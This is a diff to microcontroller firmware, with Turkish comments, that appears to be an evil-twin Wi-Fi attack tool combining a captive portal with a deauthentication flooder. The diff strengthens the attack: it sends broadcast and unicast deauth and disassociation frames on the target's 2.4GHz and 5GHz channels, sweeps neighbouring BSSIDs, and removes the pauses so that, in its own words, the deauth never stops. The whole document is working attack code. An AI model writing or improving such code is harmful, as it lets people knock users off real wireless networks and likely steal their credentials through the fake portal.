@@ -278,7 +278,6 @@ unsigned long last_netif_check_ms = 0;
 #define NETIF_CHECK_INTERVAL_MS 5000UL
 
 unsigned long last_client_connect_ms = 0;
-#define CLIENT_GRACE_MS 2000UL
 
 WiFiServer server(SERVER_PORT); 
 DNSServer  dnsServer;
@@ -524,16 +523,27 @@ void deauthTask(void *param) {
         // Ancak en garantisi, AP'yi her zaman hedefin bilinen en son kanalında tutmaktır.)
     }
 
-    // === 1. HEDEFİN ANA KANALINA YOĞUN ATIŞ (Birincil Öncelik) ===
+    // === 1. HEDEFİN ANA KANALINA YOĞUN ATIŞ — deauth hiç durmuyor ===
     wifi_set_channel(target_channel);
     for (int burst = 0; burst < 3; burst++) {
       for (int offset = -2; offset <= 2; offset++) {
           uint8_t temp_bssid[6];
           memcpy(temp_bssid, target_bssid, 6);
           temp_bssid[5] = (uint8_t)(temp_bssid[5] + offset);
-          memcpy(&frame_template[10], temp_bssid, 6);
-          memcpy(&frame_template[16], temp_bssid, 6);
+          memcpy(&frame_template[10], temp_bssid, 6);  // SA = BSSID
+          memcpy(&frame_template[16], temp_bssid, 6);  // BSSID
 
+          // --- Broadcast deauth (DA = FF:FF:FF:FF:FF:FF) ---
+          memset(&frame_template[4], 0xFF, 6);
+          frame_template[0] = 0xC0; frame_template[24] = 0x07;
+          wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+          frame_template[24] = 0x02;
+          wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+          frame_template[0] = 0xA0; frame_template[24] = 0x08;
+          wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+
+          // --- Unicast deauth (DA = BSSID) — AP'ye yönelik ters yön ---
+          memcpy(&frame_template[4], temp_bssid, 6);
           frame_template[0] = 0xC0; frame_template[24] = 0x07;
           wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
           frame_template[24] = 0x02;
@@ -541,39 +551,49 @@ void deauthTask(void *param) {
           frame_template[0] = 0xA0; frame_template[24] = 0x08;
           wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
       }
+      // Her burst sonrası 10ms yield — main loop HTTP isteklerini işleyebilsin
+      vTaskDelay(pdMS_TO_TICKS(10));
     }
 
-    // Portal meşgulse VEYA yeni bağlantı grace süresi dolmadıysa
-    // kanala geri dön ve bekle — captive portal tespiti + HTTP trafiği kesilmesin
-    wifi_set_channel(target_channel);
-    if (portal_busy || (millis() - last_client_connect_ms < CLIENT_GRACE_MS)) {
-        vTaskDelay(pdMS_TO_TICKS(100));
-        continue;
-    }
-
-    // Kısa nefes (50ms)
-    vTaskDelay(pdMS_TO_TICKS(50));
-
-    // === 2. HEDEFIN TESPİT EDİLEN 5GHz BSSID+KANALINA HEDEFLI ATIŞ ===
-    // 2.4GHz gibi: tam BSSID ile, tarama sonucu doğrulanmış kanalda
+    // === 2. HEDEFIN 5GHz KANALINA HEDEFLI ATIŞ — deauth hiç durmuyor ===
     int32_t ch5g = target_5g_channel;
     uint8_t bssid5g[6];
     memcpy(bssid5g, target_5g_bssid, 6);
-    if (ch5g > 0 && ch5g != target_channel && bssid5g[0] != 0 && !portal_busy) {
+    if (ch5g > 0 && ch5g != target_channel && bssid5g[0] != 0) {
         wifi_set_channel(ch5g);
-        memcpy(&frame_template[10], bssid5g, 6);
-        memcpy(&frame_template[16], bssid5g, 6);
         for (int burst = 0; burst < 3; burst++) {
-            frame_template[0] = 0xC0; frame_template[24] = 0x07;
-            wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-            frame_template[24] = 0x02;
-            wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-            frame_template[0] = 0xA0; frame_template[24] = 0x08;
-            wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+            for (int offset = -2; offset <= 2; offset++) {
+                uint8_t temp5g[6];
+                memcpy(temp5g, bssid5g, 6);
+                temp5g[5] = (uint8_t)(temp5g[5] + offset);
+                memcpy(&frame_template[10], temp5g, 6);  // SA = BSSID
+                memcpy(&frame_template[16], temp5g, 6);  // BSSID
+
+                // --- Broadcast deauth ---
+                memset(&frame_template[4], 0xFF, 6);
+                frame_template[0] = 0xC0; frame_template[24] = 0x07;
+                wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+                frame_template[24] = 0x02;
+                wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+                frame_template[0] = 0xA0; frame_template[24] = 0x08;
+                wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+
+                // --- Unicast deauth (DA = BSSID) ---
+                memcpy(&frame_template[4], temp5g, 6);
+                frame_template[0] = 0xC0; frame_template[24] = 0x07;
+                wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+                frame_template[24] = 0x02;
+                wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+                frame_template[0] = 0xA0; frame_template[24] = 0x08;
+                wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+            }
+            vTaskDelay(pdMS_TO_TICKS(10));
         }
     }
     // 5GHz sonrası mutlaka target_channel'a geri dön
     wifi_set_channel(target_channel);
+    // Döngü arası nefes — main loop'a HTTP fırsatı ver, deauth yine başlar
+    vTaskDelay(pdMS_TO_TICKS(150));
   }
   vTaskDelete(NULL);
 }
@@ -1109,7 +1129,6 @@ void loop() {
 
   WiFiClient client = server.available();
   if (client) {
-    last_client_connect_ms = millis();
     portal_busy = true;
     handleClient(client);
     client.flush();
